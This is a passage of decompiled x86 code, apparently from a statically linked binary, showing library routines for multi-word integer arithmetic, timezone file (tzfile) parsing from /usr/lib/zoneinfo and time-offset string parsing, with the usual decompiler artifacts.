            eax = *(A18 + ecx * 4);
            *(A8 + ecx * 4) = eax;
            ecx = ecx + 1;
        }
        eax = *(A18 + ecx * 4);
        *(A8 + ecx * 4) = eax;
        ecx = ecx + 1;
        if(Vfffffffc != ecx) {
L08059550:
            do {
                esi = A18;
                eax = *(esi + ecx * 4);
                edi = A8;
                *(edi + ecx * 4) = eax;
                eax = ecx + 1;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 2;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 3;
                *(edi + eax * 4) = *(esi + eax * 4);
                ecx = ecx + 4;
            } while(Vfffffffc != ecx);
        }
    }
    esi = Vfffffffc;
    eax = esi * 4;
    eax = eax + A8;
    eax = L08066380(eax, eax, A18 + eax, esi);
    Vfffffff8 = eax;
    if(eax != 0) {
        edi = A14;
        ebx = A8 + edi * 4;
        Vfffffff0 = edi;
        edx = *ebx;
        Vffffffec = ebx + 4;
        eax = edx + 1;
        *ebx = eax;
        ebx = Vffffffec;
        if(eax >= edx) {
            goto L080596a0;
        }
        if(!(Vfffffff0 = Vfffffff0 - 1)) {
            eax = ~Vfffffff0 & 3;
            if(Vfffffff0 > 0) {
                if(eax == 0) {
                    goto L08059644;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vffffffec = ebx + 4;
                        *ebx = edx;
                        ebx = Vffffffec;
                        if(edx != 0) {
                            goto L080596a0;
                        }
                        Vfffffff0 = Vfffffff0 - 1;
                    }
                    edi = Vffffffec;
                    edx = *edi + 1;
                    Vffffffec = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            esi = Vffffffec;
            edx = *esi + 1;
            Vffffffec = esi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L080596a0;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08059644:
                do {
                    edi = Vffffffec;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vffffffec = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *edi + 1;
                    Vffffffec = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L080596a0;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L08059710;
L080596a0:
                if(Vffffffec != ebx) {
                    ecx = 0;
                    esi = Vfffffff0 - 1;
                    Vfffffff0 = esi;
                    if(0 < esi) {
                        if(eax = esi & 3) {
                            goto L080596e4;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vffffffec;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                            ecx = ecx + 1;
                        }
                        eax = *(Vffffffec + ecx * 4);
                        *(ebx + ecx * 4) = eax;
                        ecx = ecx + 1;
                        if(Vfffffff0 != ecx) {
L080596e4:
                            do {
                                esi = Vffffffec;
                                *(ebx + ecx * 4) = *(esi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 3;
                                eax = *(esi + edx * 4);
                                *(ebx + edx * 4) = eax;
                                ecx = ecx + 4;
                            } while(Vfffffff0 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059710:
    esp = ebp - 32;
}



L0805971C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    eax = *Ac;
    if(eax <= 1) {
        != ? 0x80597ac : ;
        ecx = 0;
        if(A10 > 0) {
            if(eax = A10 & 3) {
                goto L0805977c;
            }
            if(eax > 1) {
                if(eax > 2) {
                    *ebx = 1;
                    ecx = 1;
                }
                *(ebx + ecx * 4) = *(Ac + ecx * 4);
                ecx = ecx + 1;
            }
            eax = *(Ac + ecx * 4);
            *(ebx + ecx * 4) = eax;
            ecx = ecx + 1;
            if(A10 != ecx) {
L0805977c:
                do {
                    edi = Ac;
                    *(ebx + ecx * 4) = *(edi + ecx * 4);
                    eax = ecx + 1;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    eax = ecx + 2;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    eax = ecx + 3;
                    *(ebx + eax * 4) = *(edi + eax * 4);
                    ecx = ecx + 4;
                } while(A10 != ecx);
                goto L0805980b;
                eax = 0;
                if(A10 > 0) {
                    if(edx = A10 & 3) {
                        goto L080597e4;
                    }
                    if(edx > 1) {
                        if(edx > 2) {
                            *ebx = 0;
                            eax = 1;
                        }
                        *(ebx + eax * 4) = 0;
                        eax = eax + 1;
                    }
                    *(ebx + eax * 4) = 0;
                    eax = eax + 1;
                    if(A10 != eax) {
L080597e4:
                        *(ebx + eax * 4) = 0;
                        *(ebx + eax * 4 + 4) = 0;
                        *(ebx + eax * 4 + 8) = 0;
                        *(ebx + eax * 4 + 12) = 0;
                        eax = eax + 4;
                        if(A10 != eax) {
                            goto L080597e4;
                        }
                    }
                }
            }
        }
L0805980b:
        edx = 0;
    } else {
        eax = L08058DE0(ebx, Ac, A10, eax);
        edx = eax;
    }
    esi = A10;
    *(ebx + esi * 4) = edx;
    ebx = ebx + 4;
    Vfffffffc = 1;
    if(Vfffffffc < esi) {
        if(!(esi & 1)) {
            edi = Ac;
            eax = *(edi + 4);
            if(eax <= 1) {
                edx = 0;
                if(eax != 1) {
                    goto L08059878;
                }
                (save)esi;
                (save)edi;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            } else {
                eax = L08066420(ebx, Ac, A10, eax);
            }
            edx = eax;
L08059878:
            esi = A10;
            *(ebx + esi * 4) = edx;
            ebx = ebx + 4;
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == esi) {
                goto L0805992c;
            }
        }
        do {
            esi = Ac;
            eax = *(esi + Vfffffffc * 4);
            if(eax > 1) {
                eax = L08066420(ebx, Ac, A10, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L080598c8;
                }
                (save)A10;
                (save)esi;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            }
            edx = eax;
L080598c8:
            *(ebx + A10 * 4) = edx;
            Vfffffff8 = ebx + 4;
            edi = Ac;
            eax = *(edi + Vfffffffc * 4 + 4);
            if(eax > 1) {
                eax = L08066420(Vfffffff8, Ac, A10, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L08059913;
                }
                (save)A10;
                (save)edi;
                edi = Vfffffff8;
                (save)edi;
                (save)edi;
                eax = L08066380();
            }
            edx = eax;
L08059913:
            edi = A10;
            *(Vfffffff8 + edi * 4) = edx;
            ebx = ebx + 8;
            Vfffffffc = Vfffffffc + 2;
        } while(Vfffffffc != edi);
    }
L0805992c:
    esp = ebp - 20;
}



L08059938(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A10;
    if(!(esi & 1)) {
        esi = esi - 1;
        Vfffffff0 = esi;
        if(esi > 31) {
            L08059938(A8, Ac, esi, A14);
L0805996e:
            esi = Vfffffff0;
            edi = Ac;
            (save) *(edi + esi * 4);
            (save)esi;
            (save)edi;
            edi = A8;
            ebx = edi + esi * 4;
            (save)ebx;
            *(edi + (Vfffffff0 + Vfffffff0) * 4) = L08066420();
            edi = Ac;
            (save) *(edi + esi * 4);
            (save)A10;
            (save)edi;
            (save)ebx;
            eax = A10 + Vfffffff0;
            *(A8 + eax * 4) = L08066420();
            goto L08059f40;
        }
        L0805971C(A8, Ac, Vfffffff0);
        goto L0805996e;
L080599d0:
        edi = Vfffffffc;
        L0805971C(A8 + A10 * 4, Ac + edi * 4, edi);
    } else {
        edi = A10 >> 1;
        Vfffffffc = edi;
        if(edi <= 31) {
            goto L080599d0;
        }
        L08059938(A8 + A10 * 4, Ac + edi * 4, edi, A14);
    }
    edi = Vfffffffc;
    esi = Ac;
    ebx = esi + edi * 4;
    if(L08057F48(ebx, esi, edi) >= 0) {
        (save)edi;
        (save)esi;
        (save)ebx;
        (save)A8;
        goto L08059a84;
L08059a40:
        L0805971C(A14, A8, Vfffffffc);
        goto L08059ab0;
L08059a58:
        L0805971C(A14, Ac, Vfffffffc);
    } else {
        esi = Vfffffffc;
        (save)esi;
        edi = Ac;
        (save)edi + esi * 4;
        (save)edi;
        (save)A8;
L08059a84:
        L0805A010();
        esp = esp + 16;
        if(Vfffffffc <= 31) {
            goto L08059a40;
        }
        L08059938(A14, A8, Vfffffffc, A14 + A10 * 4);
L08059ab0:
        if(Vfffffffc > 0) {
            edx = A10 * 4;
            edi = Vfffffffc;
            ecx = edi * 4;
            ebx = edx + ecx;
            if(eax = edi & 3) {
                goto L08059b14;
            }
            if(eax > 1) {
                if(eax > 2) {
                    esi = A8;
                    *(esi + ecx) = *(esi + edx);
                    edx = edx + 4;
                    ecx = ecx + 4;
                }
                edi = A8;
                *(edi + ecx) = *(edi + edx);
                edx = edx + 4;
                ecx = ecx + 4;
            }
            esi = A8;
            *(esi + ecx) = *(esi + edx);
            edx = edx + 4;
            ecx = ecx + 4;
            if(edx != ebx) {
L08059b14:
                do {
                    edi = A8;
                    *(edi + ecx) = *(edi + edx);
                    *(edi + ecx + 4) = *(edi + edx + 4);
                    *(edi + ecx + 8) = *(edi + edx + 8);
                    *(edi + ecx + 12) = *(edi + edx + 12);
                    edx = edx + 16;
                    ecx = ecx + 16;
                } while(edx != ebx);
            }
        }
        esi = Vfffffffc;
        (save)esi;
        edi = A10 << 2;
        Vfffffff0 = edi;
        eax = A8 + Vfffffff0;
        ebx = esi * 4;
        (save)ebx + eax;
        (save)eax;
        (save)eax;
        Vfffffff8 = L08066380();
        (save)A10;
        (save)A14;
        ebx = ebx + A8;
        (save)ebx;
        (save)ebx;
        Vfffffff8 = Vfffffff8 - L0805A010();
        esp = esp + 32;
        if(Vfffffffc <= 31) {
            goto L08059a58;
        }
        L08059938(A14, Ac, Vfffffffc, A14 + Vfffffff0);
    }
    ebx = A8 + Vfffffffc * 4;
    Vfffffff8 = Vfffffff8 + L08066380(ebx, ebx, A14, A10);
    if(Vfffffff8 != 0) {
        ebx = ebx + A10 * 4;
        esi = Vfffffffc;
        Vfffffff4 = esi;
        edx = *ebx;
        Vfffffff0 = ebx + 4;
        eax = Vfffffff8 + edx;
        *ebx = eax;
        ebx = Vfffffff0;
        if(eax >= edx) {
            goto L08059ccc;
        }
        Vfffffff4 = esi;
        if(!(esi = esi - 1)) {
            eax = ~esi & 3;
            if(esi > 0) {
                if(eax == 0) {
                    goto L08059c70;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vfffffff0 = ebx + 4;
                        *ebx = edx;
                        ebx = Vfffffff0;
                        if(edx != 0) {
                            goto L08059ccc;
                        }
                        Vfffffff4 = Vfffffffc + -2;
                    }
                    esi = Vfffffff0;
                    edx = *esi + 1;
                    Vfffffff0 = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                }
            }
            edi = Vfffffff0;
            edx = *edi + 1;
            Vfffffff0 = edi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L08059ccc;
            }
            if(!(Vfffffff4 = Vfffffff4 - 1)) {
L08059c70:
                do {
                    esi = Vfffffff0;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vfffffff0 = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *esi + 1;
                    Vfffffff0 = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ccc;
                    }
                } while(Vfffffff4 = Vfffffff4 - 1);
                goto L08059d3c;
L08059ccc:
                if(Vfffffff0 != ebx) {
                    ecx = 0;
                    edi = Vfffffff4 - 1;
                    Vfffffff4 = edi;
                    if(0 < edi) {
                        if(eax = edi & 3) {
                            goto L08059d10;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vfffffff0;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                            ecx = ecx + 1;
                        }
                        *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                        ecx = ecx + 1;
                        if(Vfffffff4 != ecx) {
L08059d10:
                            do {
                                edi = Vfffffff0;
                                *(ebx + ecx * 4) = *(edi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 3;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                ecx = ecx + 4;
                            } while(Vfffffff4 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059d3c:
    ecx = 0;
    if(Vfffffffc > 0) {
        if(eax = Vfffffffc & 3) {
            goto L08059d80;
        }
        if(eax > 1) {
            if(eax > 2) {
                *A8 = *A14;
                ecx = 1;
            }
            eax = *(A14 + ecx * 4);
            *(A8 + ecx * 4) = eax;
            ecx = ecx + 1;
        }
        eax = *(A14 + ecx * 4);
        *(A8 + ecx * 4) = eax;
        ecx = ecx + 1;
        if(Vfffffffc != ecx) {
L08059d80:
            do {
                esi = A14;
                eax = *(esi + ecx * 4);
                edi = A8;
                *(edi + ecx * 4) = eax;
                eax = ecx + 1;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 2;
                *(edi + eax * 4) = *(esi + eax * 4);
                eax = ecx + 3;
                *(edi + eax * 4) = *(esi + eax * 4);
                ecx = ecx + 4;
            } while(Vfffffffc != ecx);
        }
    }
    esi = Vfffffffc;
    eax = esi * 4;
    eax = eax + A8;
    eax = L08066380(eax, eax, A14 + eax, esi);
    Vfffffff8 = eax;
    if(eax != 0) {
        edi = A10;
        ebx = A8 + edi * 4;
        Vfffffff4 = edi;
        edx = *ebx;
        Vfffffff0 = ebx + 4;
        eax = edx + 1;
        *ebx = eax;
        ebx = Vfffffff0;
        if(eax >= edx) {
            goto L08059ed0;
        }
        if(!(Vfffffff4 = Vfffffff4 - 1)) {
            eax = ~Vfffffff4 & 3;
            if(Vfffffff4 > 0) {
                if(eax == 0) {
                    goto L08059e74;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vfffffff0 = ebx + 4;
                        *ebx = edx;
                        ebx = Vfffffff0;
                        if(edx != 0) {
                            goto L08059ed0;
                        }
                        Vfffffff4 = Vfffffff4 - 1;
                    }
                    edi = Vfffffff0;
                    edx = *edi + 1;
                    Vfffffff0 = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                }
            }
            esi = Vfffffff0;
            edx = *esi + 1;
            Vfffffff0 = esi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L08059ed0;
            }
            if(!(Vfffffff4 = Vfffffff4 - 1)) {
L08059e74:
                do {
                    edi = Vfffffff0;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    edi = edi + 4;
                    Vfffffff0 = edi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                    Vfffffff4 = Vfffffff4 - 1;
                    edx = *edi + 1;
                    Vfffffff0 = edi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L08059ed0;
                    }
                } while(Vfffffff4 = Vfffffff4 - 1);
                goto L08059f40;
L08059ed0:
                if(Vfffffff0 != ebx) {
                    ecx = 0;
                    esi = Vfffffff4 - 1;
                    Vfffffff4 = esi;
                    if(0 < esi) {
                        if(eax = esi & 3) {
                            goto L08059f14;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vfffffff0;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vfffffff0 + ecx * 4);
                            ecx = ecx + 1;
                        }
                        eax = *(Vfffffff0 + ecx * 4);
                        *(ebx + ecx * 4) = eax;
                        ecx = ecx + 1;
                        if(Vfffffff4 != ecx) {
L08059f14:
                            do {
                                esi = Vfffffff0;
                                *(ebx + ecx * 4) = *(esi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(esi + edx * 4);
                                edx = ecx + 3;
                                eax = *(esi + edx * 4);
                                *(ebx + edx * 4) = eax;
                                ecx = ecx + 4;
                            } while(Vfffffff4 != ecx);
                        }
                    }
                }
            }
        }
    }
L08059f40:
    esp = ebp - 28;
}





L0805A010(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A8;
    esi = Ac;
    edx = A10;
    ecx = A14;
    eax = ecx;
    ecx = ecx >> 3;
    if(!(eax = ~eax & 7)) {
        ecx = ecx + 1;
        edi = edi - (eax << 2);
        esi = esi - eax;
        edx = edx - eax;
        goto ((eax >> 2) + (eax >> 2) * 8 + 0x805a04d);
    }
    do {
        eax = *esi;
        asm("sbb eax,[edx]");
        *edi = eax;
        eax = *(esi + 4);
        asm("sbb eax,[edx+0x4]");
        *(edi + 4) = eax;
        eax = *(esi + 8);
        asm("sbb eax,[edx+0x8]");
        *(edi + 8) = eax;
        eax = *(esi + 12);
        asm("sbb eax,[edx+0xc]");
        *(edi + 12) = eax;
        eax = *(esi + 16);
        asm("sbb eax,[edx+0x10]");
        *(edi + 16) = eax;
        eax = *(esi + 20);
        asm("sbb eax,[edx+0x14]");
        *(edi + 20) = eax;
        eax = *(esi + 24);
        asm("sbb eax,[edx+0x18]");
        *(edi + 24) = eax;
        eax = *(esi + 28);
        asm("sbb eax,[edx+0x1c]");
        *(edi + 28) = eax;
        edi = edi + 32;
        esi = esi + 32;
        edx = edx + 32;
    } while(ecx = ecx - 1);
    asm("sbb eax,eax");
    return(~eax);
}





L0805A0F0(A8)
/* unknown */ void  A8;
{



    eax = ( *A8 & 255) << 8;
    edx = (eax | *(A8 + 1) & 255) << 8;
    edx = ( *(A8 + 2) & 255 | edx) << 8;
    return(*(A8 + 3) & 255 | edx);
}


L0805A11C()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    *L08078B1C = 0x8068ea4;
    *L08078B20 = 0x8068ea4;
    *L08078B28 = 0;
    *L08078B24 = 0;
    *L08078B2C = 0;
    ecx = 0;
    if(*L0807B0E8 > 0) {
        ebx = 0x807b82c;
        edx = 0x807b830;
        esi = 0;
        do {
            eax = *edx;
            *(eax * 4 + 0x8078b1c) = *(esi + 0x807b834) + 0x807c82c;
            if(*edx != 0) {
                *L08078B28 = 1;
            }
            if(ecx != 0 && *edx != 0) {
                goto L0805a1a8;
            }
            *L08078B24 = ~( *ebx);
            if(*edx != 0) {
L0805a1a8:
                *L08078B2C = ~( *ebx);
            }
            ebx = ebx + 16;
            edx = edx + 16;
            esi = esi + 16;
            ecx = ecx + 1;
        } while(*L0807B0E8 > ecx);
    }
    eax = time(0);
    esi = eax + 31622400;
    ecx = 0;
    if(*L0807B0E4 > 0) {
        ebx = 0x807b0e0;
        do {
            if(*(ebx + ecx * 4 + 16) <= esi) {
                edx = (( *(ebx + ecx + 1496) & 255) << 4) + 0x807b82c;
                eax = *(edx + 4);
                *(eax * 4 + 0x8078b1c) = *(edx + 8) + 0x807c82c;
                if(*(edx + 4) != 0) {
                    *L08078B28 = 1;
                }
                if(ecx != 0 && *(edx + 4) != 0) {
                    goto L0805a234;
                }
                *L08078B24 = ~( *edx);
                if(*(edx + 4) != 0) {
L0805a234:
                    *L08078B2C = ~( *edx);
                }
            }
            ecx = ecx + 1;
        } while(*L0807B0E4 > ecx);
    }
}



L0805A254(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffe2b0;
	/* unknown */ void  Vffffe2b4;
	/* unknown */ void  Vffffe2b8;
	/* unknown */ void  Vffffe2bc;
	/* unknown */ void  Vffffe2c0;
	/* unknown */ void  Vffffe2d8;
	/* unknown */ void  Vffffe2dc;
	/* unknown */ void  Vffffe2e0;
	/* unknown */ void  Vffffe2e4;
	/* unknown */ void  Vffffe2e8;
	/* unknown */ void  Vffffe2ec;
	/* unknown */ void  Vfffffbfc;



    if(A8 == 0) {
        A8 = "localtime";
        if(A8 == 0) {
            goto L0805a3ef;
        }
    }
    edx = A8;
    if(*edx == 58) {
        A8 = edx + 1;
    }
    if(*A8 != 47) {
        esi = "/usr/lib/zoneinfo";
        if(esi == 0) {
            goto L0805a3ef;
        }
        al = 0;
        edi = esi;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        edx = !ecx;
        edi = A8;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        if(edx + !ecx - 1 > 1024) {
            goto L0805a3ef;
        }
        (save)esi;
        ebx = & Vfffffbfc;
        L08056640(ebx);
        (save)"/";
        L080577C0(ebx);
        (save)A8;
        L080577C0(ebx);
        A8 = ebx;
    }
    ebx = open(A8, O_RDONLY);
    if(ebx != -1) {
        edi = read(ebx, & Vffffe2c0, 6460);
        if(close(ebx) == 0 && edi > 43) {
            Vffffe2bc = L0805A0F0( & Vffffe2d8);
            *Ac = L0805A0F0( & Vffffe2dc);
            *(Ac + 4) = L0805A0F0( & Vffffe2e0);
            *(Ac + 8) = L0805A0F0( & Vffffe2e4);
            ebx = L0805A0F0( & Vffffe2e8);
            ecx = Ac;
            *(ecx + 12) = ebx;
            if(*ecx <= 50 && *(ecx + 8) - 1 <= 255 && *(ecx + 4) <= 370 && ebx <= 50) {
                edx = Vffffe2bc;
                if(*(ecx + 8) == edx) {
                    goto L0805a3c0;
                }
                if(edx == 0) {
L0805a3c0:
                    ecx = Ac;
                    ebx = *(ecx + 4) + *(ecx + 4) * 4;
                    eax = *(ecx + 8);
                    eax = eax + eax + eax * 4 + 44 + ebx + *(ecx + 12);
                    edx = *ecx << 3;
                    Vffffe2b0 = edx;
                    if(edi >= eax + Vffffe2b0 + Vffffe2bc) {
                        goto L0805a3fc;
                    }
                }
            }
        }
    }
L0805a3ef:
    eax = -1;
    goto L0805a577;
L0805a3fc:
    esi = & Vffffe2ec;
    edi = 0;
    if(*(Ac + 4) > 0) {
        do {
            eax = L0805A0F0(esi);
            edx = Ac;
            *(edx + edi * 4 + 16) = eax;
            esi = esi + 4;
            edi = edi + 1;
        } while(*(edx + 4) > edi);
    }
    edi = 0;
    if(*(Ac + 4) > 0) {
        do {
            al = *esi;
            edx = Ac;
            *(edi + edx + 1496) = al;
            esi = esi + 1;
            if(*(edx + 8) <= ( *(edi + edx + 1496) & 255)) {
                goto L0805a3ef;
            }
            edi = edi + 1;
        } while(*(edx + 4) > edi);
    }
    edi = 0;
    if(*(Ac + 8) > 0) {
        Vffffe2b4 = 1868;
        do {
            ebx = Ac + Vffffe2b4;
            *ebx = L0805A0F0(esi);
            esi = esi + 4;
            eax = *esi & 255;
            *(ebx + 4) = eax;
            esi = esi + 1;
            if(eax > 1) {
                goto L0805a3ef;
            }
            eax = *esi & 255;
            *(ebx + 8) = eax;
            esi = esi + 1;
            if(eax < 0 || *(Ac + 12) < eax) {
                goto L0805a3ef;
            }
            Vffffe2b4 = Vffffe2b4 + 16;
            edi = edi + 1;
        } while(*(Ac + 8) > edi);
    }
    edi = 0;
    if(*(Ac + 12) > 0) {
        do {
            al = *esi;
            ecx = Ac;
            *(edi + ecx + 5964) = al;
            esi = esi + 1;
            edi = edi + 1;
        } while(*(ecx + 12) > edi);
    }
    edx = Ac;
    *(edi + edx + 5964) = 0;
    edi = 0;
    if(*edx > 0) {
        Vffffe2b8 = 6016;
        do {
            ebx = Ac + Vffffe2b8;
            *ebx = L0805A0F0(esi);
            esi = esi + 4;
            *(ebx + 4) = L0805A0F0(esi);
            esi = esi + 4;
            Vffffe2b8 = Vffffe2b8 + 8;
            edi = edi + 1;
        } while(*Ac > edi);
    }
    edi = 0;
    if(*(Ac + 8) > 0) {
        ebx = 1868;
        do {
            ecx = Ac + ebx;
            Vffffe2b0 = ecx;
            if(Vffffe2bc == 0) {
                *(Vffffe2b0 + 12) = 0;
            } else {
                eax = *esi & 255;
                *(ecx + 12) = eax;
                esi = esi + 1;
                if(eax > 1) {
                    goto L0805a3ef;
                }
            }
            ebx = ebx + 16;
            edi = edi + 1;
        } while(*(Ac + 8) > edi);
    }
    eax = 0;
L0805a577:
    esp = ebp + -7516;
}


L0805A584(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    ecx = A8;
    dl = *ecx;
    if(dl != 0) {
        eax = dl & 255;
        for(ebx = *L08078FA0; !( *(ebx + eax * 2 + 1) & 8) && dl + 212 > 1 && dl != 43; eax = dl & 255) {
            ecx = ecx + 1;
            dl = *ecx;
            if(dl == 0) {
                break;
            }
        }
    }
    return(ecx);
}



L0805A5C4(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    if(ebx != 0) {
        edx = *ebx & 255;
        if(*( *L08078FA0 + edx * 2 + 1) & 8) {
            goto L0805a628;
        }
        edx = 0;
        al = *ebx;
        if(al != 0) {
            Vfffffffc = *L08078FA0;
            do {
                ecx = al & 255;
                if(*(Vfffffffc + ecx * 2 + 1) & 8) {
                    break;
                }
                edx = ecx + edx + edx + edx * 8 - 48;
                if(edx > A14) {
                    goto L0805a628;
                }
                ebx = ebx + 1;
                al = *ebx;
            } while(al != 0);
        }
        if(A10 > edx) {
            goto L0805a628;
        }
        *Ac = edx;
        eax = ebx;
    } else {
L0805a628:
        eax = 0;
    }
    esp = ebp - 16;
}


L0805A634(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    ecx = L0805A5C4(A8, & Vfffffffc, 0, 24);
    if(ecx != 0) {
        edx = Vfffffffc;
        *Ac = (edx + (edx + edx * 2) * 2 << 5) + edx << 4;
        if(*ecx != 58) {
            goto L0805a6bd;
        }
        ecx = ecx + 1;
        ecx = L0805A5C4(ecx, & Vfffffffc, 0, 59);
        if(ecx != 0) {
            *Ac = *Ac + (Vfffffffc + Vfffffffc * 2 + (Vfffffffc + Vfffffffc * 2) * 4 << 2);
            if(*ecx != 58) {
                goto L0805a6bd;
            }
            ecx = ecx + 1;
            ecx = L0805A5C4(ecx, & Vfffffffc, 0, 59);
            if(ecx != 0) {
                goto L0805a6b8;
            }
        }
    }
    eax = 0;
    goto L0805a6bf;
L0805a6b8:
    *Ac = *Ac + Vfffffffc;
L0805a6bd:
    eax = ecx;
L0805a6bf:
    esp = ebp - 12;
}


L0805A6C8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ecx = A8;
    if(*ecx == 45) {
        ebx = 1;
        ecx = ecx + 1;
    } else {
        edx = *ecx & 255;
        if(!( *( *L08078FA0 + edx * 2 + 1) & 8)) {
            al = *ecx;
            ecx = ecx + 1;
            if(al != 43) {
                goto L0805a705;
            }
        }
        ebx = 0;
    }
    ecx = L0805A634(ecx, Ac);
    if(ecx == 0) {
L0805a705:
        eax = 0;
    } else {
        if(ebx != 0) {
            *Ac = ~( *Ac);
        }
        eax = ecx;
    }
}



L0805A720(A8, Ac)
